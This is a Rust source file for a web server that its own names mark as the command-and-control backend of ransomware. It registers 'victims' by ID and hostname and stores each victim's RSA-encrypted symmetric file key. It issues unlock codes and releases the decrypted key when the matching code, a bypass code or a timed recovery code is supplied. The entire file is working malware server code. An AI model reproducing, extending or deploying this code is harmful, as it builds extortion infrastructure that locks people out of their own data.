use axum::{
    Router,
    extract::{self, State},
    http::StatusCode,
    routing::post,
};
use axum_embed::ServeEmbed;
use axum_server::tls_rustls::RustlsConfig;
use hex::{decode, encode};
use log::{debug, error, info, warn};
use purecrypto::rsa::BoxedRsaPrivateKey;
use rand::{RngExt, SeedableRng, rngs::StdRng};
use rust_embed::RustEmbed;
use std::{net::SocketAddr, sync::Arc, time::Duration, time::SystemTime};
use tokio::signal;

mod config;
mod models;

use models::Victim;

use coconut_crab_lib::{
    file::get_exe_path_dir,
    web::{
        codes::RECOVERY_REQUEST_CODE,
        server_tls::{get_tls_private_key, get_tls_public_key},
        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
        validate::{
            check_proof, validate_code, validate_hostname, validate_id, validate_key,
            validate_proof,
        },
    },
};

#[derive(Clone)]
struct AppState {
    db: toasty::Db,
    private_key: Arc<BoxedRsaPrivateKey>,
}

#[derive(RustEmbed, Clone)]
#[folder = "assets/public"]
struct AssetPublic;

#[derive(RustEmbed)]
#[folder = "assets/private"]
struct AssetPrivate;

#[tokio::main(flavor = "multi_thread")]
async fn main() {
    env_logger::Builder::new()
        .filter_level(log::LevelFilter::Info)
        .init();

    let db_path = {
        let exe_directory_path = get_exe_path_dir();
        format!("turso:{}/victims.db", exe_directory_path.to_string_lossy())
    };
    debug!("Database path: {db_path}");

    let db = toasty::Db::builder()
        .models(toasty::models!(Victim))
        .connect(&db_path)
        .await
        .expect("Failed to connect to Turso database");

    db.push_schema()
        .await
        .expect("Failed to push database schema");
    debug!("Database schema pushed");

    let pem = String::from_utf8(
        AssetPrivate::get("asym-priv-key.pem")
            .expect("Failed to get private RSA key file")
            .data
            .to_vec(),
    )
    .expect("Failed to read PEM file");
    let private_key =
        Arc::new(BoxedRsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
    debug!("RSA private key parsed and cached");

    let shared_state = AppState { db, private_key };
    debug!("Web Application State Configured");

    let serve_public_assets = ServeEmbed::<AssetPublic>::new();

    let app = Router::new()
        .route("/register", post(register))
        .route("/upload-sym-key", post(upload_sym_key))
        .route("/announce-completion", post(announce_completion))
        .route("/download-sym-key", post(download_sym_key))
        .nest_service("/download", serve_public_assets)
        .with_state(shared_state);
    debug!("Routing Configured");

    let handle = axum_server::Handle::new();
    let server_handle = handle.clone();
    tokio::spawn(async move {
        let ctrl_c = async {
            signal::ctrl_c()
                .await
                .expect("failed to install Ctrl+C handler");
        };

        #[cfg(unix)]
        let terminate = async {
            signal::unix::signal(signal::unix::SignalKind::terminate())
                .expect("failed to install signal handler")
                .recv()
                .await;
        };

        #[cfg(not(unix))]
        let terminate = std::future::pending::<()>();

        tokio::select! {
            () = ctrl_c => {},
            () = terminate => {},
        }

        info!("Received termination signal, starting graceful shutdown");
        server_handle.graceful_shutdown(Some(Duration::from_secs(30)));
    });

    let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));
    debug!("Socket Address Configured");

    if config::HTTPS {
        rustls::crypto::aws_lc_rs::default_provider()
            .install_default()
            .expect("Failed to install rustls crypto provider");
        let tls_config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
            .await
            .expect("Failed to configure web server TLS");
        debug!("TLS Configured");

        axum_server::bind_rustls(addr, tls_config)
            .handle(handle)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    } else {
        axum_server::bind(addr)
            .handle(handle)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    }
    debug!("Web Server Started");
}

fn generate_code() -> String {
    let mut rng = StdRng::from_rng(&mut rand::rng());
    let code = loop {
        let mut code = String::with_capacity(19);
        for segment in 0..4 {
            for _ in 0..4 {
                let random_char = rng.random_range(0..62);
                let character = if random_char < 10 {
                    (b'0' + random_char) as char
                } else if random_char < 36 {
                    (b'A' + (random_char - 10)) as char
                } else {
                    (b'a' + (random_char - 36)) as char
                };
                code.push(character);
            }
            if segment < 3 {
                code.push('-');
            }
        }
        if code != RECOVERY_REQUEST_CODE {
            break code;
        }
        debug!("Generated the reserved recovery sentinel by miracle... regenerating");
    };
    debug!("Generated new code: {code}");
    code
}

fn get_epoch_time() -> i64 {
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(time) => {
            debug!("Reported Time: {time:?}");
            time.as_secs().cast_signed()
        }
        Err(error) => {
            error!("Reported time before UNIX Epoch: {error}");
            0
        }
    }
}

fn decrypt_key(private_key: &BoxedRsaPrivateKey, key: &str) -> Result<String, &'static str> {
    let key_vec = match decode(key) {
        Ok(bytes) => {
            debug!("Decoded Key: {bytes:?}");
            bytes
        }
        Err(error) => {
            error!("Failed To Decode Key: {error}");
            return Err("Invalid Key");
        }
    };
    let key = match private_key.decrypt_pkcs1v15(&key_vec) {
        Ok(key) => {
            debug!("Decrypted Key: {key:?}");
            key
        }
        Err(error) => {
            error!("Failed To Decrypt Key: {error}");
            return Err("Invalid Key");
        }
    };
    Ok(encode(key))
}

async fn register(
    State(state): State<AppState>,
    extract::Json(registration): extract::Json<Registration>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    info!("Received request to register");

    if !validate_id(&registration.id) {
        warn!("[] Invalid ID: {}", registration.id);
        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
    }

    if !validate_hostname(&registration.hostname) {
        warn!(
            "[{}] Invalid Hostname: {}",
            registration.id, registration.hostname
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Hostname"));
    }

    if !validate_proof(&registration.proof) {
        warn!(
            "[{}] Invalid Proof: {}",
            registration.id, registration.proof
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
    }

    let proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
    if !check_proof(&proof_source, config::PRESHARED_SECRET, &registration.proof) {
        warn!(
            "[{}] Proof Verification Failure: {}",
            registration.id, registration.proof
        );
        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
    }
    debug!(
        "[{}] Proof Verification Success: {}",
        registration.id, registration.proof
    );

    let mut db = state.db.clone();

    info!("[{}] Adding New Victim", registration.id);
    if let Err(err) = toasty::create!(Victim {
        id: registration.id.clone(),
        hostname: registration.hostname.clone(),
        key: String::new(),
        code: String::new(),
        upload_time: 0,
        complete: false,
    })
    .exec(&mut db)
    .await
    {
        if err.is_driver_operation_failed() {
            let err_str = err.to_string().to_lowercase();
            if err_str.contains("unique")
                || err_str.contains("primary key")
                || err_str.contains("duplicate")
            {
                warn!(
                    "[{}] Existing Victim Found (duplicate key)",
                    registration.id
                );
                return Err((StatusCode::CONFLICT, "Victim already exists"));
            }
        }
        error!("[{}] Failed to insert victim: {err}", registration.id);
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    }
    debug!("Inserted new victim into database");
    Ok("Success")
}

async fn upload_sym_key(
    State(state): State<AppState>,
    extract::Json(uploadsymkey): extract::Json<UploadSymKey>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    info!("Received request to upload symmetric key");

    if !validate_id(&uploadsymkey.id) {
        warn!("[] Invalid ID: {}", uploadsymkey.id);
        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
    }

    if !validate_key(&uploadsymkey.key) {
        warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
        return Err((StatusCode::BAD_REQUEST, "Invalid Key"));
    }

    if !validate_proof(&uploadsymkey.proof) {
        warn!(
            "[{}] Invalid Proof: {}",
            uploadsymkey.id, uploadsymkey.proof
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
    }

    let proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
    if !check_proof(&proof_source, config::PRESHARED_SECRET, &uploadsymkey.proof) {
        warn!(
            "[{}] Proof Verification Failure: {}",
            uploadsymkey.id, uploadsymkey.proof
        );
        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
    }
    debug!(
        "[{}] Proof Verification Success: {}",
        uploadsymkey.id, uploadsymkey.proof
    );

    let mut db = state.db.clone();

    let Ok(mut victim) = Victim::get_by_id(&mut db, &uploadsymkey.id).await else {
        warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
        warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
    };

    let code = generate_code();
    let upload_time = get_epoch_time();

    if let Err(err) = victim
        .update()
        .key(uploadsymkey.key.clone())
        .code(code.clone())
        .upload_time(upload_time)
        .exec(&mut db)
        .await
    {
        error!("[{}] Failed to update victim: {err}", uploadsymkey.id);
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    }

    info!(
        "[{}] Added Symmetric Key: {}",
        uploadsymkey.id, uploadsymkey.key
    );
    info!("[{}] Added Code: {}", uploadsymkey.id, code);
    info!("[{}] Added Upload Time: {}", uploadsymkey.id, upload_time);

    Ok("Success")
}

async fn announce_completion(
    State(state): State<AppState>,
    extract::Json(announcecompletion): extract::Json<AnnounceCompletion>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    info!("Received request to announce completion");

    if !validate_id(&announcecompletion.id) {
        warn!("[] Invalid ID: {}", announcecompletion.id);
        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
    }

    if !validate_proof(&announcecompletion.proof) {
        warn!(
            "[{}] Invalid Proof: {}",
            announcecompletion.id, announcecompletion.proof
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
    }

    let proof_source = announcecompletion.id.as_bytes().to_vec();
    if !check_proof(
        &proof_source,
        config::PRESHARED_SECRET,
        &announcecompletion.proof,
    ) {
        warn!(
            "[{}] Proof Verification Failure: {}",
            announcecompletion.id, announcecompletion.proof
        );
        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
    }
    debug!(
        "[{}] Proof Verification Success: {}",
        announcecompletion.id, announcecompletion.proof
    );

    let mut db = state.db.clone();

    let Ok(mut victim) = Victim::get_by_id(&mut db, &announcecompletion.id).await else {
        warn!("[{}] Existing Victim Not Found", announcecompletion.id);
        warn!("[{}] Cannot Announce Completion", announcecompletion.id);
        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
    };

    info!("[{}] Designating As Complete", announcecompletion.id);
    if let Err(err) = victim.update().complete(true).exec(&mut db).await {
        error!(
            "[{}] Failed to update victim completion: {err}",
            announcecompletion.id
        );
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    }

    Ok("Success")
}

async fn download_sym_key(
    State(state): State<AppState>,
    extract::Json(downloadsymkey): extract::Json<DownloadSymKey>,
) -> Result<String, (StatusCode, &'static str)> {
    info!("Received request to download symmetric key");

    if !validate_id(&downloadsymkey.id) {
        warn!("[] Invalid ID: {}", downloadsymkey.id);
        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
    }

    if !validate_code(&downloadsymkey.code) {
        warn!(
            "[{}] Invalid Code: {}",
            downloadsymkey.id, downloadsymkey.code
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Code"));
    }

    if !validate_proof(&downloadsymkey.proof) {
        warn!(
            "[{}] Invalid Proof: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
    }

    let proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
    if !check_proof(
        &proof_source,
        config::PRESHARED_SECRET,
        &downloadsymkey.proof,
    ) {
        warn!(
            "[{}] Proof Verification Failure: {}",
            downloadsymkey.id, downloadsymkey.proof
        );
        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
    }
    debug!(
        "[{}] Proof Verification Success: {}",
        downloadsymkey.id, downloadsymkey.proof
    );

    let mut db = state.db.clone();

    let existing_victim = if let Ok(victim) = Victim::get_by_id(&mut db, &downloadsymkey.id).await {
        debug!(
            "[{}] Existing Victim Found: {:?}",
            downloadsymkey.id, victim
        );
        victim
    } else {
        warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
        warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
        return Err((StatusCode::NOT_FOUND, "Victim does not exist"));
    };

    let mut recovery_valid = false;
    if !existing_victim.complete && downloadsymkey.code == RECOVERY_REQUEST_CODE {
        info!("[{}] Key Recovery Requested", downloadsymkey.id);
        if existing_victim.upload_time == 0 {
            error!("[{}] No Upload Time Recorded", downloadsymkey.id);
        } else {
            let current_time = get_epoch_time();
            debug!(
                "[{}] Current Epoch Time: {} seconds",
                downloadsymkey.id, current_time
            );
            let recovery_window = config::RECOVERY_WINDOW_SECONDS;
            debug!(
                "[{}] Key Recovery Window: {} seconds",
                downloadsymkey.id, recovery_window
            );
            let elapsed_time = current_time - existing_victim.upload_time;
            debug!(
                "[{}] Elapsed Time: {} seconds",
                downloadsymkey.id, elapsed_time
            );
            if elapsed_time <= recovery_window.cast_signed() {
                recovery_valid = true;
            }
        }
        if recovery_valid {
            info!("[{}] Key Recovery Valid", downloadsymkey.id);
        } else {
            warn!("[{}] Key Recovery Not Valid", downloadsymkey.id);
        }
    }

    if existing_victim.code == downloadsymkey.code
        || downloadsymkey.code == config::BYPASS_CODE
        || recovery_valid
    {
        info!(
            "[{}] Correct Code: {}",
            downloadsymkey.id, downloadsymkey.code
        );
        info!("[{}] Providing Decrypted Key", downloadsymkey.id);
        return decrypt_key(&state.private_key, &existing_victim.key)
            .map_err(|e| (StatusCode::BAD_REQUEST, e));
    }
    warn!(
        "[{}] Incorrect Code: {}",
        downloadsymkey.id, downloadsymkey.code
    );
    Err((StatusCode::FORBIDDEN, "Invalid Code"))
}
